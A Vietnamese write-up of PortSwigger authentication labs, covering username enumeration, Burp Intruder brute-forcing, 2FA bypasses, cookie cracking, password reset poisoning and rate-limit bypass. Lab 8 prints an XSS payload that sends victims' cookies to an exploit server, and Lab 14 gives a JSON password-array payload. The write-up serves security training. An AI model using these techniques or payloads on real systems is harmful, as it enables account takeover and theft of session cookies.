# PORT SWIGGER WRITE UP: AUTHENTICATION

## Lab 1: Username enumeration via different responses

![](https://i.imgur.com/6m4Lslq.png)

- Bài lab này dễ bị tấn công bằng cách liệt kê tên người dùng và mật khẩu. Nó có một tài khoản với tên người dùng và mật khẩu có thể dự đoán được, có thể tìm thấy trong danh sách từ sau:

  + Candidate usernames
  + Candidate passwords
- Đầu tiên ta sẽ lấy mẫu intruder bằng cách đăng nhập thử với user: admin password: 123456. Sau đó ta sẽ vào tab proxy tại thẻ http history ta gửi url login đến intruder

![Alt text](https://i.imgur.com/7ZZ4AGB.png)

- Ta thực hiện brute-force với 2 đối tượng là username và password với attack tyle là Cluster Bomb với các tài khoản và mật khẩu được cung cấp ở Candidate usernames và Candidate passwords

![Alt text](https://i.imgur.com/iJT7pf2.png)

- Sau một hồi brute-force ta nhận thấy những request trả về status 200 là các giá trị sai vì hầu hết các request đều trả về stutus 200 và stutus 302 là request mà chúng ta cần tìm 

![Alt text](https://i.imgur.com/kijJRuR.png)

- Vậy là ta có username: apollo password: abc123

![Alt text](https://i.imgur.com/I1v1gL9.png)

## Lab 2: Username enumeration via subtly different responses

![Alt text](https://i.imgur.com/mB79oZ0.png)

- Bài lab này rất dễ bị tổn thương trước các cuộc tấn công bạo lực bằng cách liệt kê tên người dùng và mật khẩu. Nó có một tài khoản với tên người dùng và mật khẩu có thể dự đoán được, có thể tìm thấy trong danh sách từ sau:
  + Candidate usernames
  + Candidate passwords

- Bài này tương tự bài lab trên, sau khi thực hiện y như bài lab 1 ta thu được kết quả:

![Alt text](https://i.imgur.com/Z8iSkO9.png)

 username: aix password: abc123
 
 ![Alt text](https://i.imgur.com/GY8O0D2.png)

## Lab 3: Username enumeration via response timing

 ![Alt text](https://i.imgur.com/2pyUI33.png)

- Bài lab này yêu cầu chúng ta brute-force tài khoản và mật khẩu dựa vào độ trễ của response
- Vì bài lab chúng ta đã thử nhập sai mật khẩu quá nhiều lần nên trang web không cho chúng ta thử nữa

![Alt text](https://i.imgur.com/8X06Wia.png)

Vậy nên ta sẽ sử dụng câu lệnh `x-forwarded for` để thay đổi header của request để tiếp tục thử usename và password

![Alt text](https://i.imgur.com/y7B1S4p.png)

Như vậy chúng ta đã đăng nhập vào trang  web như bình thường với username và password đã được cung cấp wiener:peter. Bây giờ ta thử với 1 password radom ta nhận thấy độ trễ của trang web đã thay đổi 605ms so với 587ms

![Alt text](https://i.imgur.com/uDiLXgE.png)

- Bây giờ ta thử nó với 1 password dài hơn hẳn thì thời gian xử kú của nó cũng cao hơn hẳn lên tới 1181ms

 ![Alt text](https://i.imgur.com/AfoVVaj.png)

 - Và nếu ta cũng với mật khẩu radom đo ta thử lại nó với 1 username là sai thì thời gian xử lí của nó lại giảm xuống còn 614ms
  
  ![Alt text](https://i.imgur.com/L0IHV4E.png)

  - Như vậy với kết quả như vậy, ta có ý tưởng là brute-force username với tài khoản radom như trên ta chỉ cần chọn username nào có thời gian phản hồi cao hơn hẳn. Ở đây ta sẽ chọn attack type là pitchfork
![Alt text](https://i.imgur.com/YeznZc4.png)
vì danh sách chỉ có 100 tên người dùng nên payload1 ta chỉ cần để từ 1 đến 100 step là 1 và payload2 ta dùng danh sách Candidate usernames mà đề bài đã cho

![Alt text](https://i.imgur.com/7InZPXr.png)

![Alt text](https://i.imgur.com/AAxfiqK.png)

![Alt text](https://i.imgur.com/ZTS8fwW.png)

- Với ý tưởng như vậy ta nhận thấy tài khoản am có thời gian xử lý cao nhất nên username sẽ là: am. Với username là: am bây giờ ta tiếp tục brute-force với password nằm trong bảng Candidate passwords. Bây giờ ta chỉ cần tìm xem password nào trả về stutus 302 thì nó sẽ là password chính xác
 
 ![Alt text](https://i.imgur.com/Uo6TXNp.png)

- Như vậy username là: am password: 2000

![Alt text](https://i.imgur.com/1FDJnQl.png)

## Lab 4: 2FA simple bypass

![Alt text](https://i.imgur.com/9obOR72.png)

- Theo như đề bài, chúng ta đã có thông tin đăng nhập của nạn nhân. Sau khi đăng nhập vào tài khoản chính chủ, chúng ta sẽ được nhắc nhập mã xác minh gồm 4 chữ số được lấy từ trang email của tài khoản chính chủ

![Alt text](https://i.imgur.com/UfTbmQU.png)

![Alt text](https://i.imgur.com/e0TUDsX.png)

Sau khi nhập mã xác minh chúng ta điều hướng tới `my account` và lưu url của trang

- Tiếp theo ta sẽ đăng nhập với tài khoản Carlos cho đến khi trang web yêu cầu mã xác minh. Khi này ta tiến hành chèn url đã copy vừa rồi và thay đổi id thành "carlos"

![Alt text](https://i.imgur.com/wIc0xfd.png)

## Lab 5: 2FA broken logic

![Alt text](https://i.imgur.com/ZWOs8qp.png)

- Bài lab này yêu cầu chúng ta đổi mật khẩu bằng tính năng quên mật khẩu tài khoản Carlos. 
- Đầu tiên ta đăng nhập vào tài khoản của chính chủ `wiener:peter`
 ![Alt text](https://i.imgur.com/JYeAftx.png)

Ta nhận thấy có `verify=wiener` ở phần cookie. Ta thử thay wiener bằng carlos thì không có hiện tượng gì xảy ra, trang web vẫn yêu cầu đoạn mã xác thực gồm 4 chữ số. Ta thử vào email để lấy mã như bài trước và nhập mã đó vào thì nhận ra chúng ta đang đăng nhập vào với tài khoản wiener 

![Alt text](https://i.imgur.com/YdrpAg4.png)

Ta nhận thấy verify ở đây vẫn là wiener, vậy nên khi ta nhập mã xác thực thì mã này vẫn là của tài khoản wiener điều này được xác định dựa trên session đã cấp cho wiener trước đó. Vì thế bây giờ chúng ta sẽ thử thay đổi session của nó ngay từ GET login2

![Alt text](https://i.imgur.com/aXG2T7m.png)
(GET thành công)

Như vậy, mã xác thực của carlos đã có, bây giờ ta sẽ đi tiến hành brute-force mã xác thực đoạn mã gồm 4 chữ số với các kí tự từ 0-9

![Alt text](https://i.imgur.com/BatLfLV.png)
 
 Sau 1 thời gian brute-force ta thu được mã xác nhận là 0750

 ![Alt text](https://i.imgur.com/ubnjzre.png)

 ## Lab 6: 2FA bypass using a brute-force attack

![](https://i.imgur.com/iSfxCN4.png)

- Bài lab cho chúng ta username và password của người dùng nhưng lại không cho ta quyền truy cập vào tài khoản. Nhiệm vụ của chúng ta là phải brute-force được mã xác thực. Ta nhận thấy sau khi thử 2 lần mã xác thực thì trang web tự động đưa chúng ta về với trang đăng nhập ban đầu. Tuy nhiên, ứng dụng không khóa tài khoản vì tôi có thể thử lại ngay lập tức

![](https://i.imgur.com/FoTFdml.png)

- Sau khi tham khảo thông tin gợi ý từ đề bài thì chúng ta có thông tin phòng thí nghiệm này chỉ ra rằng cần phải có macro hoặc tiện ích mở rộng Burp như Turbo Intruder. Và ở đây chúng ta sẽ dùng marco burp. Chúng ta vào tab Project options => chọn sessions. Ở đây chúng ta sẽ cố gắng kết hợp các request thành một marco

![Alt text](https://i.imgur.com/m6XzUwF.png)

Và xác thực rằng Get login2 có trả về MFA-code khi chạy macro

![Alt text](https://i.imgur.com/fbDu8ct.png)

_ Tiếp theo ta thiết lập các quy tắc xử lý phiên 

![Alt text](https://i.imgur.com/xvHAEVl.png)

![Alt text](https://i.imgur.com/xUyHefl.png)

- Bây giờ ta tiến hành brute-force để lấy mã xác thực. 

![Alt text](https://i.imgur.com/SiQRNMY.png)

Sau một thời gian thì ta nhận được mã xác thực 1470 trả về stutus 302

![](https://i.imgur.com/OfLJLfk.png)

## Lab 7: Brute-forcing a stay-logged-in cookie

![](https://i.imgur.com/VlC9UrF.png)

- Lab này cho phép người dùng duy trì trạng thái đăng nhập ngay cả sau khi họ đóng phiên trình duyệt. Cookie được sử dụng để cung cấp chức năng này dễ bị tấn công brute-force.
- Đầu tiên, ta đăng nhập vào với username và password mà đề bài đã cho `wiener:peter` với `stay-login`. Trong kết quả phản hồi, ta nhận thấy trang web có cấp cho chúng ta 1 cookie là `stay-logged-in`

![](https://i.imgur.com/KweT49l.png)

Ta nhận thấy đoạn cookie này trông khá giống như 1 chuỗi được mã hóa bằng base64 nên ta sẽ thử gửi chuỗi này tới tab decoder để giải mã

![](https://i.imgur.com/ohhgKzz.png)

Thật bất ngờ ta thu được 1 chuỗi được kết hợp bằng chính username đã đăng nhập và 1 chuỗi gồm 32 kí tự. Vì thế, nó có lẽ là 1 chuỗi gì đó được mã hóa bằng md5, một hàm hay được dùng để mã hóa mật khẩu. Để xác thực điều này, ta sẽ tiếp tục thử giải mã chuỗi đó bằng md5

![](https://i.imgur.com/Gy3nTWz.png)

Không ngoài dự đoán chuỗi đó là kết quả của việc mã hóa mật khẩu đăng nhập bằng md5. Như vậy ta đã biết được công thức tạo thành của `stay-logged-in` là **base64encode(username:(md5hash(password)))**

- Sau khi ta biết được công thức, ta tiến hành brute-force bằng cách thay đổi tab Intruder này với wordlist mật khẩu và prefix thay đổi thành carlos:

![](https://i.imgur.com/7fmmfvE.png)

Như vậy ta đã solve được bài lap với `stay-logged-in: Y2FybG9zOjc2NDE5YzU4NzMwZDlmMzVkZTdhYzUzOGMyZmQ2NzM3` hay với username: carlos, password: qazwsx

## Lab 8: Offline password cracking

![](https://i.imgur.com/VudgU1h.png)

- Lab này lưu trữ hàm băm mật khẩu của người dùng trong cookie. Phòng lab cũng chứa lỗ hổng XSS trong chức năng bình luận. Để giải quyết lab, hãy lấy cookie đăng nhập thường xuyên của Carlos và sử dụng nó để bẻ khóa mật khẩu của anh ấy. Sau đó, đăng nhập với tư cách Carlos và xóa tài khoản của anh ấy khỏi trang "My account".

- Theo cách làm của bài lab trước ta dễ dàng tìm được công thức của cookie `stay-logged-in` của trang web là: **base64encode(username:(md5hash(password)))**

![](https://i.imgur.com/OYrgZKB.png)

![](https://i.imgur.com/UesiRRt.png)

![](https://i.imgur.com/Gy3nTWz.png)

- Sau khi biết được cách thức tạo nên stay-logged-in ta log out và vào xem 1 bài post bất kỳ để tiến hành tìm lỗ hổng XSS. Đầu tiên ta sẽ xác thực xem trang web có thực sự bị lỗ hổng xss hay không bằng cách chèn vào 1 đoạn mã script alert ra dòng thông báo 'xin chào'

![](https://i.imgur.com/gcHy4VY.png)

![](https://i.imgur.com/DKul0XV.png)

- Vì trang web có in ra dòng thông báo nên ta chắc chắn rằng nó có bị lỗ hổng XSS. Dựa vào lỗ hổng này, ta sẽ tiến hành lấy cookie của trang web bằng việc chèn thêm 1 đọa mã script:

  `<script>document.location='https://exploit-0aad009e044daf7882d31a1601740053.exploit-server.net/'+document.cookie</script>`

- Sau khi submit ta quay lại blog và tiến hành mở exploit server: 
- Sau khi mở exploit server, chúng ta tiến hành truy cập access logs. Tại đây ta sẽ tìm thấy 1 yêu cầu có chứa stay-logged-in được mã hóa

![](https://i.imgur.com/FBbbzco.png)

- Tiếp theo chúng ta sẽ tiến hành giải mã chuỗi stayed-logged vừa tìm được bằng công thức **base64encode(username:(md5hash(password)))** mà chúng ta đã tìm được ở trên

![](https://i.imgur.com/KSdveeF.png)
![](https://i.imgur.com/gmrE9Dy.png)

- Như vậy ta tìm được username: carlos và password: onceuponatime

![](https://i.imgur.com/4TSEkOm.png)

## Lab 9: Password reset broken logic

![](https://i.imgur.com/p8ZhozL.png)

- Chức năng đặt lại mật khẩu của lab này dễ bị tấn công. Để giải quyết bài thí nghiệm, hãy đặt lại mật khẩu của Carlos sau đó đăng nhập và truy cập trang "my account" của anh ấy.
- Đầu tiên, chúng ta thử đăng nhập vào với username và password mà đề bài cung cấp nhưng nhận thấy không có gì đặc biệt. Tiếp theo, ta sử dụng tính năng quên mật khẩu của trang web

![](https://i.imgur.com/TVPwhTY.png)

- Sau đó trang web có gửi về email của client một url sau khi click vào thì nó chuyển hướng chúng ta đến nơi để thay đổi password

![](https://i.imgur.com/Woy6FjS.png)

![](https://i.imgur.com/xf31cxF.png)

Sau khi submit ta có nhận được 1 yêu cầu post trông có vẻ khá đáng ngờ bao gồm cả username và password vừa được đổi. Ở đây, ta thử thay đổi username wiener thành carlos ngay trên request post vừa chặn. Sau đó ta thử đăng nhập vào tài khoản với carlos với password vừa đổi thì may mắn nó đăng nhập vào được thật

![](https://i.imgur.com/8eBIWTq.png)

## Lab 10: Password reset poisoning via middleware

![](https://i.imgur.com/MkVXxvb.png)

- Phòng lab này dễ bị nhiễm độc đặt lại mật khẩu. Người dùng Carlos sẽ bất cẩn nhấp vào bất kỳ liên kết nào trong email mà anh ta nhận được. Để giải quyết bài thí nghiệm, hãy đăng nhập vào tài khoản của Carlos. Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener:peter. Mọi email được gửi tới tài khoản này đều có thể được đọc qua ứng dụng email trên máy chủ khai thác.
- Cũng như bài trước, ta click vào quên mật khẩu và tiến hành đặt lại mật khẩu trên chính username wiener. Chúng ta cũng nhận được 1 link được gửi vào email client. say khi click vào nó đưa chúng ta đến 1 trang đặt lại mật khẩu như thông thường. Nhưng sau khi ấn submit thì ở đây chúng ta lại nhận được 1 Post khác với bài lab trước, nó không còn chưa username mà thay bằng `temp-forgot-password-token`

![](https://i.imgur.com/T769FrD.png)

token này được lưu trong link mà trang web gửi về email. Và token này sẽ thay đổi, mỗi khi chúng ta thực hiện yêu cầu đổi mật khẩu dù cho token trước có được sử dụng hay không

![](https://i.imgur.com/hlkbTyW.png)

- Sau khi tìm hiểu trên  [mozilla.org](https://developer.mozilla.org/en-US/docs/Web/HTTP) ta tìm được [X-Forwarded-Host](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host). Nó được sử dụng để xác định tiêu đề máy chủ ban đầu được gửi bởi máy khách trong các trường hợp có proxy ngược có thể thay thế các tiêu đề khác. Vì vậy, tôi bắt đầu chơi proxy ngược.

- Sau khi nhận được yêu cầu đặt lại mật khẩu ban đầu, gửi nó tới Burp Repeater và thêm tiêu đề X-Forwarded-Host trỏ đến máy chủ khai thác

![](https://i.imgur.com/C4sslij.png)

Không ngoài dự đóa thì nó vẫn sẽ gửi cho chúng ta link đặt lại mật khẩu. Bây giờ chúng ta sẽ thử đổi làm lại các bước trên và thay bằng carlos
![](https://i.imgur.com/v3ZzEIe.png)

- Sau đó, chúng ta check lại access log thì phát hiện 1 địa chỉ ip lạ kèm theo token
 
 ![](https://i.imgur.com/9vdiDJZ.png)

 - Như vậy tôi đcó temp-forgot-password-token, việc bây giờ còn lại là tôi chỉ cần click vào link, sau đó thay đổi mật khẩu và đổi temp-forgot-password-token của wiener thành: wzn2idzviuuiu78vhn3xz3ufzfjc0bbv. Và sau đó đăng nhâp với username: carlos và password vừa đổi
 
 ![](https://i.imgur.com/gRHWcI6.png)

 - Như vậy chúng ta đã solve được bài lab

## Lab 11: Password brute-force via password change

![](https://i.imgur.com/qsCBuyy.png)

- Theo như bài lab, chức năng thay đổi mật khẩu của phòng thí nghiệm dễ bị brute-force attack. Để giải quyết bài lab này, chúng ta phải sử dụng danh sách candidate passwords để brute force mật khẩu carlos và truy cập vào my account
- Đầu tiên chúng ta thử đăng nhập vào với tài khoản mà bài lab đã cho wiener:peter. Trang web đưa ta đến một trang để đổi mật khẩu

![](https://i.imgur.com/ZlMwcaq.png)

- Theo như quan sát sơ bộ lúc ban đầu, thì nó gồm 1 thẻ inout để nhập mật khẩu hiện tại và 2 thẻ để nhập mật khẩu thay đổi. Nhưng khi ta dùng burp suite để chặn respone của nó thì chúng ta thấy nó còn xuất hiện 1 thẻ input kiểu hidden chứa value là username.

![](https://i.imgur.com/OrINgxm.png)

- Sau khi ấn submit thì chúng ta có 1 request post có chứa username và password mới được đổi.

![](https://i.imgur.com/28KtfIJ.png)

Ở đây ta thử đổi username thành carlos xem điều gì xảy ra. Và nó đưa ta ta về lại trang đăng nhập và hủy luôn phiên đăng nhập. Vì vậy ở đây chúng ta nghĩ đến sử dụng macro lặp lại đăng nhập để làm quy tắc

![](https://i.imgur.com/CRSyoA4.png)

- Sau đó ta rẽ gửi request đổi mật khẩu tới tab intruder rồi tiến hành brute force

![](https://i.imgur.com/AEx3lSs.png)

- Như vậy ta đã đổi mật khẩu tài khoản carlos thành công
![](https://i.imgur.com/s34TSHR.png)

# Lab 12: Broken brute-force protection, IP block

![](https://i.imgur.com/JWJMWcb.png)

- Đầu tiên, ta sẽ thử đăng nhập với thông tin mà bài lab đã cho thì nhận thấy 1 điều rằng lần này nó sẽ báo về lỗi trực tiếp khi username hoặc password bị sai

![](https://i.imgur.com/CBqTgrM.png)

Và ở bài lab này, nếu chúng ta đăng nhập sai quá 3 lần thì sẽ bị khóa 1 phút, nhưng quá trình này sẽ bị xóa nếu lần thứ 3 chúng ta nhập đúng thông tin. Vì thể ở đây ta sẽ dùng BurpSuite Intruder tiến hành brute-force. Ở đây ta sẽ chọn Pitchfork attack để mật để username tương ứng với mật khẩu:

![](https://i.imgur.com/AKT6PlE.png)

![](https://i.imgur.com/r97GD17.png)

![](https://i.imgur.com/hzLkHvn.png)

Sau 1 thời gian brute-force ta tìm được password là: 1111

![](https://i.imgur.com/kfGC8BW.png)

## Lab 13: Username enumeration via account lock

![](https://i.imgur.com/jjp88hG.png)

- Đầu tiên ta sẽ thử đăng nhập với 1 username bất kỳ là wiener. Nhưng sau khi thử rất nhiều lần trang web báo về vẫn là invalid username or password. Bây giờ ta sẽ thử 10 lần với mỗi username trong Candidate usernames xem có chuyện gì xảy ra. Ở đây ta sẽ dùng đoạn mã python để tạo ra file lab.txt với mỗi username lặp lại 10 lần 

```new_lines = []
try:
    with open('user.txt','r') as file:
        contents = file.readlines()
except Exception as e:
    print(e)
finally:
    file.close()

for content in contents:
    new_lines.append(content.strip())

    
try:
    with open('Lab.txt','w') as file:
        for line in new_lines:
            file.write((line+'\n')*10)
except Exception as e:
    print(e)
finally:
    file.close()
```
![](https://i.imgur.com/ihLzUwY.png)

- Sau 1 thời gian brute-force ta nhận thấy có username aq trả về 1 độ dài khá bất thường khác hẳn với các username khác. Vậy nên ta đoán đây là username cần tìm. Tiếp theo ta thử tiếp hành brute-force mật khẩu.

![](https://i.imgur.com/CKy8o2k.png)

Kết quả trả về có 3 loại: Invalid username or password , You have made too many incorrect login attempts. Please try again in 1 minute(s) và 1 trường hợp đặc biệt không trả về kết quả gì:

![](https://i.imgur.com/n63Woqw.png)

Có vẻ đây là mật khẩu ta thử đăng nhập và bài lab đã được solved

![](https://i.imgur.com/vOQN9sv.png)

## Lab 14: Broken brute-force protection, multiple credentials per request

![](https://i.imgur.com/RZS0iW9.png)

- Ở bài lab này, ta thử gửi request đăng nhập brute-force với password nhưng không thành công. Ta nhận thấy sau 4 lần đăng nhập không thành công thì lần thứ 5 bị khóa tài khoản trong 1 phút. Để kiểm tra xem việc khóa có dựa trên nội dung nào đó trong tiêu đề HTTP hay không, tôi đã tiếp tục bằng một lần chạy Kẻ xâm nhập khác, lần này sửa đổi Tác nhân người dùng theo yêu cầu, sử dụng tiêu đề X-Forwarded-For và xóa hoặc sửa đổi giá trị cookie. Nhưng vô ích, sau ba lần thử, khóa xảy ra. 
- Ta để ý các request post ở đây, thì ta thấy có 1 điều khác lạ với những bài lab trước:

![](https://i.imgur.com/AUyqep1.png)

Thông tin đăng nhập được gửi đi dưới dạng json. Tuy nhiên, trong JSON, chúng ta có thể gửi một mảng tới một khóa thông qua []. Lợi dụng điều này chúng ta sẽ gửi password đi dưới dạng json chưa tất cả password mà bài lab cung cấp trong Candidate passwords

```
 "password":[
        "123456",
        "password",
        "12345678",
        "qwerty",
        "123456789",
        "12345",
        "1234",
        "111111",
        "1234567",
        "dragon",
        "123123",
        "baseball",
        "abc123",
        "football",
        "monkey",
        "letmein",
        "shadow",
        "master",
        "666666",
        "qwertyuiop",
        "123321",
        "mustang",
        "1234567890",
        "michael",
        "654321",
        "superman",
        "1qaz2wsx",
        "7777777",
        "121212",
        "000000",
        "qazwsx",
        "123qwe",
        "killer",
        "trustno1",
        "jordan",
        "jennifer",
        "zxcvbnm",
        "asdfgh",
        "hunter",
        "buster",
        "soccer",
        "harley",
        "batman",
        "andrew",
        "tigger",
        "sunshine",
        "iloveyou",
        "2000",
        "charlie",
        "robert",
        "thomas",
        "hockey",
        "ranger",
        "daniel",
        "starwars",
        "klaster",
        "112233",
        "george",
        "computer",
        "michelle",
        "jessica",
        "pepper",
        "1111",
        "zxcvbn",
        "555555",
        "11111111",
        "131313",
        "freedom",
        "777777",
        "pass",
        "maggie",
        "159753",
        "aaaaaa",
        "ginger",
        "princess",
        "joshua",
        "cheese",
        "amanda",
        "summer",
        "love",
        "ashley",
        "nicole",
        "chelsea",
        "biteme",
        "matthew",
        "access",
        "yankees",
        "987654321",
        "dallas",
        "austin",
        "thunder",
        "taylor",
        "matrix",
        "mobilemail",
        "mom",
        "monitor",
        "monitoring",
        "montana",
        "moon",
        "moscow"
    ]
```
![](https://i.imgur.com/hk5cDL4.png)

